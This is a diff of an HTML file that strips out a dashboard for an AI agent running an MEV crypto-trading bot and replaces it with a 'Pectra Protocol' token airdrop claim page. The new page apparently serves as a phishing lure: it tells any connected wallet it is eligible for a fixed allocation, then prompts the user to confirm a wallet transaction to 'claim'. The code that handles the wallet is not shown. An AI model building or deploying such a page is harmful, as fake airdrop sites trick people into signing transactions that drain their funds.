-.doc-badge.CSV { background: #1a2a2a; color: var(--cyan); }
-.doc-viewer-overlay {
-  display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-  background: rgba(0,0,0,0.8); z-index: 200; justify-content: center; align-items: center;
-}
-.doc-viewer-overlay.show { display: flex; }
-.doc-viewer-box {
-  background: var(--bg2); border: 1px solid var(--border); border-radius: 10px;
-  width: 80vw; max-width: 900px; max-height: 85vh; display: flex; flex-direction: column;
-}
-.doc-viewer-header {
-  padding: 14px 20px; border-bottom: 1px solid var(--border);
-  display: flex; justify-content: space-between; align-items: center;
-}
-.doc-viewer-body { flex: 1; overflow-y: auto; padding: 20px; white-space: pre-wrap; font-size: 12px; line-height: 1.7; }
-
-/* Team Screen */
-.team-mission {
-  background: linear-gradient(135deg, #0a1a0a 0%, #0a0f1a 100%);
-  border: 1px solid var(--green); border-radius: 10px;
-  padding: 24px; text-align: center; margin-bottom: 24px;
-}
-.team-mission h2 { color: var(--green); font-size: 14px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 8px; }
-.team-mission .mission-text { font-size: 16px; color: var(--text); line-height: 1.5; }
-.team-org { display: flex; flex-direction: column; gap: 24px; align-items: center; }
-.team-tier { display: flex; gap: 16px; flex-wrap: wrap; justify-content: center; }
-.team-tier-label { font-size: 11px; text-transform: uppercase; letter-spacing: 2px; color: var(--dim); margin-bottom: 8px; text-align: center; }
-.agent-card {
-  background: var(--bg2); border: 1px solid var(--border); border-radius: 10px;
-  padding: 16px; width: 220px; text-align: center; position: relative; transition: border-color 0.15s;
-}
-.agent-card:hover { border-color: var(--green); }
-.agent-card.leader { border-color: var(--green); width: 280px; }
-.agent-card.human { border-color: var(--purple); width: 280px; }
-.agent-avatar {
-  width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center;
-  justify-content: center; margin: 0 auto 10px; font-size: 20px; font-weight: bold;
-}
-.agent-card.leader .agent-avatar { background: #1a3a1a; color: var(--green); border: 2px solid var(--green); }
-.agent-card.human .agent-avatar { background: #2a1a3a; color: var(--purple); border: 2px solid var(--purple); }
-.agent-card .agent-avatar { background: #1a1a2a; color: var(--blue); border: 2px solid var(--border); }
-.agent-name { font-size: 14px; font-weight: bold; margin-bottom: 4px; }
-.agent-role { font-size: 11px; color: var(--dim); margin-bottom: 8px; }
-.agent-meta { font-size: 10px; color: var(--dim); }
-.agent-status { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 10px; margin-top: 6px; }
-.agent-status.active { background: #1a2a1a; color: var(--green); }
-.agent-status.idle { background: #2a2a1a; color: var(--yellow); }
-.team-connector { width: 2px; height: 24px; background: var(--border); }
-.team-tools { margin-top: 24px; }
-.team-tools h3 { font-size: 12px; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
-.tool-pill { display: inline-block; padding: 4px 10px; background: var(--bg3); border: 1px solid var(--border); border-radius: 16px; font-size: 11px; margin: 2px 4px; }
-
-/* Office Screen - Neural Network + Agent Cards */
-.office-grid { display: grid; grid-template-columns: 1fr; gap: 16px; }
-.nn-section { background: #060a10; border: 1px solid var(--border); border-radius: 10px; overflow: hidden; position: relative; }
-.nn-header { display: flex; align-items: center; justify-content: space-between; padding: 10px 16px; background: #0a0e17; border-bottom: 1px solid var(--border); }
-.nn-header h4 { margin: 0; color: var(--cyan); font-size: 12px; font-weight: bold; letter-spacing: 1px; }
-.nn-header .nn-badge { font-size: 9px; padding: 2px 8px; border-radius: 10px; background: rgba(0,255,136,.1); color: var(--green); border: 1px solid rgba(0,255,136,.3); }
-#nn-canvas { display: block; width: 100%; height: 320px; }
-.nn-stats { display: flex; gap: 0; border-top: 1px solid var(--border); }
-.nn-stat { flex: 1; padding: 8px 12px; text-align: center; border-right: 1px solid var(--border); font-size: 10px; }
-.nn-stat:last-child { border-right: none; }
-.nn-stat .ns-val { font-size: 16px; font-weight: bold; color: var(--green); }
-.nn-stat .ns-lbl { color: var(--dim); margin-top: 2px; }
-.agent-cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-@media(max-width:900px) { .agent-cards { grid-template-columns: repeat(2, 1fr); } }
-.agent-card { background: #0a0e17; border: 1px solid var(--border); border-radius: 8px; padding: 14px; transition: all .3s; position: relative; overflow: hidden; }
-.agent-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; }
-.agent-card.online { border-color: rgba(0,255,136,.3); }
-.agent-card.online::before { background: linear-gradient(90deg, transparent, var(--green), transparent); }
-.agent-card.offline { border-color: rgba(102,102,102,.3); }
-.agent-card .ac-top { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
-.agent-card .ac-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
-.agent-card.online .ac-dot { background: var(--green); animation: statusPulse 2s infinite; }
-.agent-card.offline .ac-dot { background: #666; }
-.agent-card .ac-name { font-weight: bold; font-size: 12px; }
-.agent-card .ac-role { font-size: 9px; color: var(--dim); }
-.agent-card .ac-body { font-size: 11px; color: var(--fg); }
-.agent-card .ac-body .ac-row { display: flex; justify-content: space-between; padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,.04); }
-.agent-card .ac-body .ac-row:last-child { border-bottom: none; }
-.agent-card .ac-body .ac-lbl { color: var(--dim); }
-.agent-card .ac-body .ac-val { color: var(--fg); font-family: monospace; font-size: 10px; }
-.agent-card .ac-body .ac-val.green { color: var(--green); }
-.agent-card .ac-body .ac-val.red { color: var(--red); }
-.agent-card .ac-body .ac-val.cyan { color: var(--cyan); }
-.agent-card .ac-bar { height: 3px; background: var(--bg3); border-radius: 2px; margin-top: 8px; overflow: hidden; }
-.agent-card .ac-bar-fill { height: 100%; border-radius: 2px; background: var(--green); transition: width .5s; }
-.ofc-bottom { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-@media(max-width:900px) { .ofc-bottom { grid-template-columns: 1fr; } }
-.ofc-feed { background: #0a0e17; border: 1px solid var(--border); border-radius: 8px; padding: 12px; max-height: 200px; overflow-y: auto; }
-.ofc-feed h5 { margin: 0 0 8px 0; color: var(--cyan); font-size: 11px; }
-.ofc-feed-item { font-size: 10px; padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,.03); display: flex; gap: 8px; }
-.ofc-feed-item .fi-time { color: var(--cyan); font-family: monospace; white-space: nowrap; }
-.ofc-feed-item .fi-act { color: var(--green); white-space: nowrap; }
-.ofc-feed-item .fi-det { color: var(--dim); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.ofc-sys { background: #0a0e17; border: 1px solid var(--border); border-radius: 8px; padding: 12px; }
-.ofc-sys h5 { margin: 0 0 8px 0; color: var(--cyan); font-size: 11px; }
-.ofc-sys .sys-row { display: flex; justify-content: space-between; font-size: 11px; padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,.04); }
-.ofc-sys .sys-row:last-child { border-bottom: none; }
-
-/* Live Ticker */
-.live-ticker { background: #0a0e14; border-bottom: 1px solid var(--border); padding: 4px 16px; display: flex; align-items: center; gap: 12px; overflow: hidden; height: 28px; }
-.live-ticker .lt-label { color: var(--cyan); font-size: 10px; font-weight: bold; text-transform: uppercase; white-space: nowrap; flex-shrink: 0; }
-.live-ticker .lt-pulse { width: 6px; height: 6px; border-radius: 50%; background: var(--green); animation: statusPulse 2s infinite; flex-shrink: 0; }
-.live-ticker .lt-scroll { display: flex; gap: 24px; animation: tickerScroll 30s linear infinite; white-space: nowrap; }
-.live-ticker .lt-item { font-size: 10px; color: var(--dim); white-space: nowrap; }
-.live-ticker .lt-item .lt-time { color: var(--cyan); margin-right: 4px; font-family: monospace; }
-.live-ticker .lt-item .lt-action { color: var(--green); margin-right: 4px; }
-.live-ticker .lt-item.error .lt-action { color: var(--red); }
-@keyframes tickerScroll { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
-
-/* Live Progress Panel */
-.live-panel { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; margin-bottom: 12px; }
-.live-agents { display: flex; gap: 10px; flex-wrap: wrap; }
-.live-agent { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; padding: 8px 12px; min-width: 120px; font-size: 11px; transition: border-color .3s; }
-.live-agent.active { border-color: var(--green); }
-.live-agent .la-name { font-weight: bold; margin-bottom: 3px; }
-.live-agent .la-task { color: var(--dim); font-size: 10px; max-width: 140px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.live-agent .la-dot { display: inline-block; width: 6px; height: 6px; border-radius: 50%; margin-right: 4px; }
-.live-agent .la-dot.on { background: var(--green); animation: statusPulse 2s infinite; }
-.live-agent .la-dot.off { background: var(--dim); }
-
-/* Current task highlight */
-.plan-item.current { border-left-color: var(--cyan); background: rgba(0,200,255,.05); }
-.plan-item.current::before { content: '▶'; position: absolute; left: -18px; top: 8px; color: var(--cyan); font-size: 10px; }
 </style>
 </head>
 <body>
 
-<div class="top-bar">
-  <span class="logo">⚡ MISSION CONTROL</span>
-  <span style="color:var(--dim)">v4</span>
-  <div class="status">
-    <span>Bot: <span class="dot" id="bot-dot"></span></span>
-    <span>Gateway: <span class="dot" id="gw-dot"></span></span>
-    <span id="live-plan-mini" style="color:var(--dim);font-size:10px"></span>
-    <span id="clock" style="color:var(--dim)"></span>
+<div class="bg-gradient"></div>
+
+<!-- Header -->
+<header class="header">
+  <a href="#" class="logo">
+    <div class="logo-icon">⬡</div>
+    Pectra Protocol
+  </a>
+  
+  <nav class="nav">
+    <a href="#">Claim</a>
+    <a href="#">Docs</a>
+    <a href="#">Governance</a>
+    <a href="#">Community</a>
+  </nav>
+  
+  <div class="header-right">
+    <div id="connectedBadge" class="connected-badge" style="display:none;">
+      <span id="walletAddr">0x...1234</span>
+    </div>
+    <button class="btn btn-primary" id="connectBtn" onclick="openModal()">
+      Connect Wallet
+    </button>
   </div>
-</div>
-<div class="live-ticker" id="live-ticker">
-  <span class="lt-pulse"></span>
-  <span class="lt-label">LIVE</span>
-  <div class="lt-scroll" id="lt-scroll">Loading live feed...</div>
-</div>
+</header>
 
-<div class="tabs">
-  <div class="tab active" data-tab="board">Task Board</div>
-  <div class="tab" data-tab="command">Command Center</div>
-  <div class="tab" data-tab="mev">MEV Bot</div>
-  <div class="tab" data-tab="trades">Trades</div>
-  <div class="tab" data-tab="calendar">Calendar</div>
-  <div class="tab" data-tab="projects">Projects</div>
-  <div class="tab" data-tab="sessions">Sessions</div>
-  <div class="tab" data-tab="memory">Memory</div>
-  <div class="tab" data-tab="docs">Docs</div>
-  <div class="tab" data-tab="team">Team</div>
-  <div class="tab" data-tab="office">Office</div>
-  <div class="tab" data-tab="system">System</div>
-</div>
-
-<!-- ═══ TASK BOARD TAB ═══ -->
-<div class="tab-content active" id="tab-board">
-  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
-    <h3 style="color:var(--dim);font-size:12px">TASK BOARD</h3>
-    <div style="display:flex;gap:8px;align-items:center">
-      <select id="board-filter-project" onchange="filterBoard()" style="background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:3px 6px;font-size:10px">
-        <option value="">All Projects</option>
-      </select>
-      <select id="board-filter-assignee" onchange="filterBoard()" style="background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:3px 6px;font-size:10px">
-        <option value="">All Assignees</option>
-        <option value="clawd">CLAWD</option>
-        <option value="user">Oshea</option>
-      </select>
-      <button class="btn sm" onclick="openNewTaskModal()">+ New Task</button>
-      <button class="btn sm" onclick="refreshBoard()">↻</button>
+<!-- Main -->
+<main class="main">
+  <!-- Hero -->
+  <section class="hero">
+    <div class="badge">
+      <span class="dot"></span>
+      Airdrop Live - Phase 1
     </div>
-  </div>
-  <div class="kanban" id="kanban-board">
-    <div class="kanban-col" data-col="backlog" ondragover="dragOver(event)" ondrop="dropCard(event,'backlog')">
-      <div class="kanban-col-header"><span style="color:var(--dim)">BACKLOG</span><span class="count" id="cnt-backlog">0</span></div>
-      <div class="kanban-col-body" id="col-backlog"></div>
-    </div>
-    <div class="kanban-col" data-col="in_progress" ondragover="dragOver(event)" ondrop="dropCard(event,'in_progress')">
-      <div class="kanban-col-header"><span style="color:var(--blue)">IN PROGRESS</span><span class="count" id="cnt-in_progress">0</span></div>
-      <div class="kanban-col-body" id="col-in_progress"></div>
-    </div>
-    <div class="kanban-col" data-col="review" ondragover="dragOver(event)" ondrop="dropCard(event,'review')">
-      <div class="kanban-col-header"><span style="color:var(--yellow)">REVIEW</span><span class="count" id="cnt-review">0</span></div>
-      <div class="kanban-col-body" id="col-review"></div>
-    </div>
-    <div class="kanban-col" data-col="done" ondragover="dragOver(event)" ondrop="dropCard(event,'done')">
-      <div class="kanban-col-header"><span style="color:var(--green)">DONE</span><span class="count" id="cnt-done">0</span></div>
-      <div class="kanban-col-body" id="col-done"></div>
-    </div>
-  </div>
-  <h3 style="color:var(--dim);font-size:12px;margin:16px 0 8px">ACTIVITY FEED</h3>
-  <div class="activity-feed" id="activity-feed">Loading...</div>
-</div>
-
-<!-- ═══ COMMAND CENTER TAB ═══ -->
-<div class="tab-content" id="tab-command">
-  <div class="cmd-bar">
-    <input type="text" id="cmd-input" placeholder="Send a task to CLAWD..." autocomplete="off">
-    <button onclick="sendTask()">Send ⏎</button>
-  </div>
-  <div class="quick-actions">
-    <button class="btn sm" onclick="quickAction('Check MEV bot status, latest trades, and wallet balance')">📊 MEV Status</button>
-    <button class="btn sm" onclick="quickAction('Check wallet ETH and WETH balances for 0x3B0FD551dd49139e3c698d77551A11458d333f6E')">💰 Wallet</button>
-    <button class="btn sm" onclick="quickAction('Check current gas price on Ethereum mainnet')">⛽ Gas</button>
-    <button class="btn sm" onclick="quickAction('Generate daily P&L report from trades database')">📈 Daily Report</button>
-    <button class="btn sm" onclick="quickAction('Check system health: CPU, memory, disk, running processes')">🖥️ System Health</button>
-    <button class="btn sm" onclick="quickAction('List all running Python and Node processes with their command lines')">🔍 Processes</button>
-  </div>
-  <div style="display:flex;justify-content:space-between;align-items:center;margin:12px 0 8px">
-    <h3 style="color:var(--dim);font-size:12px">AI TASK QUEUE <span id="task-count" style="color:var(--blue)"></span></h3>
-    <div style="display:flex;gap:6px">
-      <select id="task-filter" onchange="refreshTasks()" style="background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:3px 6px;font-size:10px">
-        <option value="">All</option>
-        <option value="running">Running</option>
-        <option value="done">Done</option>
-        <option value="error">Error</option>
-        <option value="pending">Pending</option>
-      </select>
-      <button class="btn sm" onclick="refreshTasks()">↻</button>
-    </div>
-  </div>
-  <div id="task-list"><span style="color:var(--dim)">No tasks yet. Send a command above.</span></div>
-</div>
-
-<!-- ═══ MEV BOT TAB ═══ -->
-<div class="tab-content" id="tab-mev">
-  <div class="grid" id="kpi-cards"></div>
-  <h3 style="color:var(--dim);font-size:12px;margin:12px 0 8px">STRATEGY BREAKDOWN</h3>
-  <table id="strategy-table">
-    <thead><tr><th>Event</th><th>Count</th><th>Total P&L</th><th>Avg P&L</th><th>Total Gas</th></tr></thead>
-    <tbody></tbody>
-  </table>
-  <h3 style="color:var(--dim);font-size:12px;margin:16px 0 8px">BOT LOG <button class="btn sm" onclick="refreshLog()" style="margin-left:8px">↻ Refresh</button></h3>
-  <div class="log-box" id="bot-log">Loading...</div>
-</div>
-
-<!-- ═══ TRADES TAB ═══ -->
-<div class="tab-content" id="tab-trades">
-  <h3 style="color:var(--dim);font-size:12px;margin-bottom:8px">RECENT TRADES (last 50)</h3>
-  <div style="overflow-x:auto">
-    <table id="trades-table">
-      <thead><tr><th>#</th><th>Time</th><th>Event</th><th>Strategy</th><th>Pair</th><th>Flash</th><th>Gap</th><th>Net Gap</th><th>Profit</th><th>Gas</th><th>Net</th><th>TX</th></tr></thead>
-      <tbody></tbody>
-    </table>
-  </div>
-</div>
-
-<!-- ═══ CALENDAR TAB ═══ -->
-<div class="tab-content" id="tab-calendar">
-  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
-    <h3 style="color:var(--dim);font-size:12px">DAILY PLANNER &amp; SCHEDULED WORK</h3>
-    <div style="display:flex;gap:8px;align-items:center">
-      <button class="btn sm" onclick="generateDayPlan()" title="Auto-generate plan for today">⚡ Generate Plan</button>
-      <button class="btn sm" onclick="calPrev()">&lt;</button>
-      <span id="cal-month-label" style="color:var(--text);font-size:13px;min-width:140px;text-align:center"></span>
-      <button class="btn sm" onclick="calNext()">&gt;</button>
-      <button class="btn sm" onclick="calToday()">Today</button>
-    </div>
-  </div>
-
-  <!-- Today's Plan Summary -->
-  <div id="today-plan-bar" style="margin-bottom:12px;display:none">
-    <div style="display:flex;align-items:center;gap:10px;margin-bottom:6px">
-      <span style="color:var(--cyan);font-size:12px;font-weight:bold">TODAY'S PROGRESS</span>
-      <span id="today-plan-pct" style="color:var(--green);font-size:12px;font-weight:bold"></span>
-      <span id="today-plan-counts" style="color:var(--dim);font-size:11px"></span>
-    </div>
-    <div style="height:6px;background:var(--border);border-radius:3px;overflow:hidden">
-      <div id="today-plan-fill" style="height:100%;background:var(--green);border-radius:3px;transition:width .3s;width:0%"></div>
-    </div>
-    <div id="today-next-item" style="margin-top:6px;font-size:11px;color:var(--dim)"></div>
-  </div>
-
-  <div class="cal-grid" id="cal-grid"></div>
-
-  <div style="display:flex;gap:8px;margin:12px 0;flex-wrap:wrap">
-    <div style="display:flex;align-items:center;gap:4px;font-size:10px;color:var(--dim)">
-      <span style="width:8px;height:8px;border-radius:50%;background:var(--green);display:inline-block"></span> Cron
-    </div>
-    <div style="display:flex;align-items:center;gap:4px;font-size:10px;color:var(--dim)">
-      <span style="width:8px;height:8px;border-radius:50%;background:var(--blue);display:inline-block"></span> Tasks
-    </div>
-    <div style="display:flex;align-items:center;gap:4px;font-size:10px;color:var(--dim)">
-      <span style="width:8px;height:8px;border-radius:50%;background:var(--yellow);display:inline-block"></span> Milestones
-    </div>
-    <div style="display:flex;align-items:center;gap:4px;font-size:10px;color:var(--dim)">
-      <span style="width:8px;height:8px;border-radius:50%;background:#aa66ff;display:inline-block"></span> Autonomous
-    </div>
-  </div>
-
-  <h3 style="color:var(--dim);font-size:12px;margin:16px 0 8px">ACTIVE CRON JOBS</h3>
-  <div id="cron-job-list">Loading...</div>
-  <h3 style="color:var(--dim);font-size:12px;margin:16px 0 8px">RECENT CRON RUNS</h3>
-  <div id="cron-run-list">Loading...</div>
-</div>
-
-<!-- Day Plan Overlay -->
-<div class="day-plan-overlay" id="day-plan-overlay" onclick="if(event.target===this)closeDayPlan()">
-  <div class="day-plan-panel">
-    <div class="day-plan-header">
-      <h2 id="dp-date-label">Day Plan</h2>
-      <div style="display:flex;gap:8px;align-items:center">
-        <button class="btn sm" onclick="generateDayPlan(window._dpDate)" title="Regenerate this day">⚡ Generate</button>
-        <button class="btn sm" onclick="closeDayPlan()">✕</button>
+    <h1>Claim Your $PCTRA Tokens</h1>
+    <p>The Pectra Protocol airdrop rewards early supporters and ecosystem participants. Connect your wallet to check eligibility and claim your allocation.</p>
+  </section>
+  
+  <!-- Claim Card -->
+  <section class="claim-section">
+    <div class="claim-card">
+      <h2>Your Allocation</h2>
+      
+      <div id="notConnected">
+        <div class="allocation-amount">---</div>
+        <div class="allocation-usd">Connect wallet to check</div>
+        <div class="eligibility-status pending">
+          <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/><path d="M7.002 11a1 1 0 1 1 2 0 1 1 0 0 1-2 0zM7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995z"/></svg>
+          Eligibility Unknown
+        </div>
+        <button class="btn btn-primary claim-btn" onclick="openModal()">
+          Connect Wallet to Check
+        </button>
+      </div>
+      
+      <div id="connected" style="display:none;">
+        <div class="allocation-amount" id="allocationAmount">12,847 PCTRA</div>
+        <div class="allocation-usd">≈ $2,569.40 USD</div>
+        <div class="eligibility-status">
+          <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/></svg>
+          Eligible for Airdrop
+        </div>
+        <button class="btn btn-primary claim-btn" id="claimBtn" onclick="claimTokens()">
+          Claim Tokens
+        </button>
+        <div class="divider">Connected Wallet</div>
+        <div class="wallet-info" id="connectedWallet">0x742d...F4d5</div>
+      </div>
+      
+      <div id="claiming" style="display:none;">
+        <div class="spinner"></div>
+        <p style="color: var(--text-secondary); margin-top: 16px;">Processing your claim...</p>
+        <p style="color: var(--text-dim); font-size: 13px;">Please confirm the transaction in your wallet</p>
+      </div>
+      
+      <div id="claimed" style="display:none;">
+        <div style="font-size: 48px; margin-bottom: 16px;">🎉</div>
+        <div class="allocation-amount">Claimed!</div>
+        <div class="allocation-usd">12,847 PCTRA has been sent to your wallet</div>
+        <div class="eligibility-status" style="margin-top: 24px;">
+          <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/></svg>
+          Transaction Confirmed
+        </div>
       </div>
     </div>
-    <div class="day-plan-progress">
-      <div class="bar"><div class="fill" id="dp-progress-fill" style="width:0%"></div></div>
-      <div class="pct" id="dp-progress-pct">0%</div>
-    </div>
-    <div class="plan-stats" id="dp-stats"></div>
-    <div class="plan-timeline" id="dp-timeline">
-      <div style="color:var(--dim);text-align:center;padding:20px">No items planned. Click ⚡ Generate to create a plan.</div>
-    </div>
-  </div>
-</div>
-
-<!-- ═══ PROJECTS TAB ═══ -->
-<div class="tab-content" id="tab-projects">
-  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
-    <h3 style="color:var(--dim);font-size:12px">PROJECTS</h3>
-    <button class="btn sm" onclick="openNewProjectModal()">+ New Project</button>
-  </div>
-  <div id="project-list">Loading...</div>
-</div>
-
-<!-- ═══ SESSIONS TAB ═══ -->
-<div class="tab-content" id="tab-sessions">
-  <h3 style="color:var(--dim);font-size:12px;margin-bottom:8px">OPENCLAW CRON SESSIONS</h3>
-  <div id="cron-jobs" style="margin-bottom:16px"></div>
-  <h3 style="color:var(--dim);font-size:12px;margin-bottom:8px">SESSION HISTORY</h3>
-  <div id="session-list">Loading...</div>
-  <div id="session-viewer" style="display:none"></div>
-</div>
-
-<!-- ═══ SYSTEM TAB ═══ -->
-<div class="tab-content" id="tab-system">
-  <div class="grid" id="sys-cards"></div>
-  <h3 style="color:var(--dim);font-size:12px;margin:12px 0 8px">OPENCLAW TOOLS</h3>
-  <div id="oc-tools" style="display:flex;flex-wrap:wrap;gap:6px"></div>
-  <h3 style="color:var(--dim);font-size:12px;margin:12px 0 8px">OPENCLAW SKILLS</h3>
-  <div id="oc-skills"></div>
-  <h3 style="color:var(--dim);font-size:12px;margin:16px 0 8px">ERROR LOG <button class="btn sm" onclick="refreshErrLog()" style="margin-left:8px">↻ Refresh</button></h3>
-  <div class="log-box" id="err-log" style="max-height:300px">Loading...</div>
-</div>
-
-<!-- ═══ MEMORY TAB ═══ -->
-<div class="tab-content" id="tab-memory">
-  <div class="mem-tab-row">
-    <div class="mem-tab active" onclick="switchMemTab('daily')">Daily Memories</div>
-    <div class="mem-tab" onclick="switchMemTab('longterm')">Long-Term Memory</div>
-  </div>
-  <div id="mem-daily-view" class="memory-layout">
-    <div class="memory-sidebar" id="mem-sidebar">Loading...</div>
-    <div class="memory-viewer" id="mem-viewer">
-      <h2>Select a date to view memories</h2>
-      <div class="mem-content" style="color:var(--dim)">Click a date on the left to read that day's journal entry.</div>
-    </div>
-  </div>
-  <div id="mem-longterm-view" style="display:none">
-    <div class="memory-viewer" style="max-height:none">
-      <h2>Long-Term Memory (MEMORY.md)</h2>
-      <div class="mem-content" id="mem-longterm-content">Loading...</div>
-    </div>
-  </div>
-</div>
-
-<!-- ═══ DOCS TAB ═══ -->
-<div class="tab-content" id="tab-docs">
-  <div class="docs-toolbar">
-    <input type="text" id="docs-search" placeholder="Search documents..." oninput="debounceDocSearch()">
-    <button class="btn sm" onclick="refreshDocs()">Refresh</button>
-  </div>
-  <div id="docs-categories" style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px"></div>
-  <div class="docs-grid" id="docs-grid">Loading...</div>
-</div>
-
-<!-- ═══ TEAM TAB ═══ -->
-<div class="tab-content" id="tab-team">
-  <div id="team-container">Loading...</div>
-</div>
-
-<!-- ═══ OFFICE TAB ═══ -->
-<div class="tab-content" id="tab-office">
-  <div class="office-grid">
-    <!-- Neural Network Visualization -->
-    <div class="nn-section">
-      <div class="nn-header">
-        <h4>NEURAL NETWORK — REAL-TIME INFERENCE ENGINE</h4>
-        <span class="nn-badge" id="nn-status">ACTIVE</span>
+  </section>
+  
+  <!-- Stats -->
+  <section class="stats-section">
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-value">847M</div>
+        <div class="stat-label">Total Supply</div>
       </div>
-      <canvas id="nn-canvas" width="1200" height="320"></canvas>
-      <div class="nn-stats" id="nn-stats">
-        <div class="nn-stat"><div class="ns-val" id="ns-nodes">24</div><div class="ns-lbl">Nodes</div></div>
-        <div class="nn-stat"><div class="ns-val" id="ns-conns">86</div><div class="ns-lbl">Connections</div></div>
-        <div class="nn-stat"><div class="ns-val" id="ns-signals">0</div><div class="ns-lbl">Signals/min</div></div>
-        <div class="nn-stat"><div class="ns-val" id="ns-inference">0ms</div><div class="ns-lbl">Inference</div></div>
-        <div class="nn-stat"><div class="ns-val" id="ns-accuracy">--</div><div class="ns-lbl">Accuracy</div></div>
-        <div class="nn-stat"><div class="ns-val" id="ns-uptime">--</div><div class="ns-lbl">Uptime</div></div>
+      <div class="stat-card">
+        <div class="stat-value">127M</div>
+        <div class="stat-label">Airdrop Allocation</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value">284,721</div>
+        <div class="stat-label">Eligible Wallets</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value">$0.20</div>
+        <div class="stat-label">Token Price (Est.)</div>
       </div>
     </div>
-    <!-- Agent Status Cards -->
-    <div class="agent-cards" id="agent-cards">
-      <div class="agent-card offline" id="ac-clawd"><div class="ac-top"><div class="ac-dot"></div><div><div class="ac-name" style="color:#00ff88">CLAWD</div><div class="ac-role">Lead Orchestrator</div></div></div><div class="ac-body"><div class="ac-row"><span class="ac-lbl">Status</span><span class="ac-val" id="ac-clawd-status">Loading...</span></div><div class="ac-row"><span class="ac-lbl">Current</span><span class="ac-val cyan" id="ac-clawd-task">--</span></div><div class="ac-row"><span class="ac-lbl">Plan</span><span class="ac-val" id="ac-clawd-plan">--</span></div></div><div class="ac-bar"><div class="ac-bar-fill" id="ac-clawd-bar" style="width:0%"></div></div></div>
-      <div class="agent-card offline" id="ac-mev"><div class="ac-top"><div class="ac-dot"></div><div><div class="ac-name" style="color:#4488ff">MEV OPERATOR</div><div class="ac-role">eth_now.py Bot</div></div></div><div class="ac-body"><div class="ac-row"><span class="ac-lbl">Bot</span><span class="ac-val" id="ac-mev-status">--</span></div><div class="ac-row"><span class="ac-lbl">Trades</span><span class="ac-val" id="ac-mev-trades">--</span></div><div class="ac-row"><span class="ac-lbl">P&L</span><span class="ac-val" id="ac-mev-pnl">--</span></div><div class="ac-row"><span class="ac-lbl">Today</span><span class="ac-val" id="ac-mev-today">--</span></div></div></div>
-      <div class="agent-card offline" id="ac-chain"><div class="ac-top"><div class="ac-dot"></div><div><div class="ac-name" style="color:#ffaa00">CHAIN INVESTIGATOR</div><div class="ac-role">On-Chain Analysis</div></div></div><div class="ac-body"><div class="ac-row"><span class="ac-lbl">Tasks</span><span class="ac-val" id="ac-chain-tasks">--</span></div><div class="ac-row"><span class="ac-lbl">Scans</span><span class="ac-val" id="ac-chain-scans">--</span></div><div class="ac-row"><span class="ac-lbl">Last</span><span class="ac-val" id="ac-chain-last">--</span></div></div></div>
-      <div class="agent-card offline" id="ac-security"><div class="ac-top"><div class="ac-dot"></div><div><div class="ac-name" style="color:#ff4466">SECURITY AUDITOR</div><div class="ac-role">Vulnerability Scanner</div></div></div><div class="ac-body"><div class="ac-row"><span class="ac-lbl">Status</span><span class="ac-val" id="ac-sec-status">--</span></div><div class="ac-row"><span class="ac-lbl">Audits</span><span class="ac-val" id="ac-sec-audits">--</span></div><div class="ac-row"><span class="ac-lbl">Alerts</span><span class="ac-val" id="ac-sec-alerts">--</span></div></div></div>
-      <div class="agent-card offline" id="ac-monitor"><div class="ac-top"><div class="ac-dot"></div><div><div class="ac-name" style="color:#aa66ff">SYSTEM MONITOR</div><div class="ac-role">Infrastructure Watch</div></div></div><div class="ac-body"><div class="ac-row"><span class="ac-lbl">CPU</span><span class="ac-val" id="ac-mon-cpu">--</span></div><div class="ac-row"><span class="ac-lbl">Memory</span><span class="ac-val" id="ac-mon-mem">--</span></div><div class="ac-row"><span class="ac-lbl">Next Cron</span><span class="ac-val cyan" id="ac-mon-cron">--</span></div></div></div>
